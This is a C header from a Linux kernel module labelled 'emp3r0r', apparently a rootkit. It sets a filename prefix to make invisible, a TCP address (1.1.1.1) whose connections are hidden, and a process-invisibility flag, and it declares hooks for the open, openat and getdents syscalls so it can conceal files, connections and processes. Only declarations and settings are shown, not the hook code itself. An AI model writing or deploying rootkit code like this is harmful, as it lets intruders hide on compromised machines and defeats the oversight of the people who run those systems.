#ifndef EM_H
#define EM_H

#include <linux/dirent.h>
#include <linux/fs.h>

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};

// module meta data
MODULE_DESCRIPTION("emp3r0r");
MODULE_AUTHOR("jm33-ng");
MODULE_LICENSE("GPL");

/*
 * module settings
 * */
// when requested filename starts with HIDE_ME, it becomes invisible
// any attempt to open that file, gets ENOENT error
#define HIDE_ME "jm33-ng"
#define TCP_HIDE_ME "1.1.1.1"
#define PF_INVISIBLE 0x10000000

// declare original syscalls
typedef asmlinkage long (*orig_open_t)(const char*, int, int);
typedef asmlinkage long (*orig_openat_t)(int, const char*, int, int);
typedef asmlinkage long (*orig_getdents_t)(unsigned int, struct linux_dirent*, unsigned int);
typedef asmlinkage long (*orig_getdents64_t)(unsigned int, struct linux_dirent64*, unsigned int);
orig_open_t orig_open;
orig_openat_t orig_openat;
orig_getdents_t orig_getdents;
orig_getdents64_t orig_getdents64;

#endif
